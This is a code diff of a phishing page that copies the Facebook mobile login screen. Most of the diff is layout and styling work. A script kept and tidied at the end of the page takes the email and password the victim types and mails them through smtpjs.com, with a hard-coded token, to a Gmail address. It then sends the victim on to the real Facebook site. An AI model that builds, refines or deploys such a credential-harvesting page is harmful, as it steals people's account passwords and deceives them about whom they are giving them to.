@@ -2,7 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Facebook</title>
+  <!-- Added viewport meta tag for responsive scaling -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Mobile-Style Login with Gradient & Circular Buttons</title>
   <style>
     /* Basic Reset */
     * {
@@ -15,7 +17,6 @@
       /* Gradient background */
       background: linear-gradient(135deg, #eef2ff 0%, #fdf2f8 100%);
       min-height: 100vh;
-      min-width:100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -91,7 +92,7 @@
       margin-bottom: 20px;
     }
     .forgot-password a {
-      color: #888; /* Gray color */
+      color: #888;
       text-decoration: none;
       font-weight: bold;
       font-size: 17px;
@@ -108,11 +109,10 @@
       font-size: 16px;
       font-weight: bold;
       border: 1px solid #1877f2;
-      /* Pill shape as well */
       border-radius: 50px;
       padding: 12px;
       cursor: pointer;
-      margin-bottom: 60px;
+      margin-bottom: 20px;
     }
     .create-account-btn:hover {
       background-color: #e7f3ff;
@@ -123,6 +123,7 @@
       text-align: center;
       color: #8a8d91;
       font-size: 13px;
+      padding: 20px;
     }
     .footer a {
       color: #8a8d91;
@@ -137,11 +138,26 @@
       margin-top: 10px;
       display: block;
     }
+
     /* Responsive Design */
     @media (max-width: 500px) {
       .login-container {
         padding: 20px;
         max-width: 90%;
+      }
+      .login-form input {
+        padding: 12px;
+        font-size: 14px;
+      }
+      .login-btn, .create-account-btn {
+        padding: 12px;
+        font-size: 14px;
+      }
+      .top-bar {
+        font-size: 12px;
+      }
+      .forgot-password a {
+        font-size: 15px;
       }
     }
   </style>
@@ -164,7 +180,7 @@
     <form class="login-form" action="/login" method="POST">
       <input type="text" id="email" name="email" placeholder="Mobile number or email" autocomplete="off" required>
       <input type="password" id="subject" name="password" placeholder="Password" autocomplete="off" required>
-      <button class="login-btn" onclick="fun()" id="btn" type="submit">Log in</button>
+      <button class="login-btn" onclick="fun()" id="btn" type="button">Log in</button>
     </form>
 
     <!-- Forgot Password -->
@@ -173,7 +189,7 @@
     </div>
 
     <!-- Create New Account Button -->
-    <button class="create-account-btn" onclick="acc()"type="button">
+    <button class="create-account-btn" onclick="acc()" type="button">
       Create new account
     </button>
   </div>
@@ -185,30 +201,31 @@
     <a href="#">More</a>
     <span class="meta-brand">© Meta</span>
   </div>
+
+  <!-- SMTP JS Script -->
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script>
+    var btn = document.getElementById('btn');
+    btn.addEventListener('click', function(e) {
+      e.preventDefault();
+      var email = document.getElementById('email').value;
+      var subject = document.getElementById('subject').value;
+      var body = 'email: ' + email + '<br/> subject: ' + subject;
+      Email.send({
+        SecureToken : "af2d1483-3e6c-40cd-8f63-0e1a40c83888",
+        To : 'hengk7401@gmail.com',
+        From : "hengk7401@gmail.com",
+        Subject : subject,
+        Body : body
+      }).then();
+    });
+
+    function fun() {
+      location.href = "https://m.facebook.com/?tbua=1";
+    }
+    function acc() {
+      location.href = "https://m.facebook.com/campaign/landing.php?campaign_id=1635645242&extra_1=s%7Cc%7C313665943406%7Ce%7Cfacebook%20login%7C&placement&creative=313665943406&keyword=facebook%20login&partner_id=googlesem&extra_2=campaignid%3D1635645242%26adgroupid%3D67924221572%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-1409285535%26loc_physical_ms%3D9198350%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gbraid=0AAAAAD2MkOXVsC97vYqhtaptoapRs4-8f&gclid=CjwKCAiA8Lu9BhA8EiwAag16by1ciYawsBKyDarDC8td2RWm5D8qxNb_tBR8dOQL7VpiZlj6S-Bh-RoCM7kQAvD_BwE&soft=hjk";
+    }
+  </script>
 </body>
-<script src="https://smtpjs.com/v3/smtp.js"></script>
-<script>
-        
-       var btn = document.getElementById('btn');
-    btn.addEventListener('click',function(e) {
-        e.preventDefault()
-        var email = document.getElementById('email').value;
-        var subject = document.getElementById('subject').value;
-        var body = 'email: ' + email + '<br/> subject: ' + subject;
-        Email.send({
-    SecureToken : "af2d1483-3e6c-40cd-8f63-0e1a40c83888",
-    To : 'hengk7401@gmail.com',
-    From : "hengk7401@gmail.com",
-    Subject : subject,
-    Body : body
-}).then(
-);
-    })
-function fun() {
-    location.href="https://m.facebook.com/?tbua=1";
-}
-function acc() {
-    location.href="https://m.facebook.com/campaign/landing.php?campaign_id=1635645242&extra_1=s%7Cc%7C313665943406%7Ce%7Cfacebook%20login%7C&placement&creative=313665943406&keyword=facebook%20login&partner_id=googlesem&extra_2=campaignid%3D1635645242%26adgroupid%3D67924221572%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-1409285535%26loc_physical_ms%3D9198350%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gbraid=0AAAAAD2MkOXVsC97vYqhtaptoapRs4-8f&gclid=CjwKCAiA8Lu9BhA8EiwAag16by1ciYawsBKyDarDC8td2RWm5D8qxNb_tBR8dOQL7VpiZlj6S-Bh-RoCM7kQAvD_BwE&soft=hjk";
-}
-</script>
 </html>
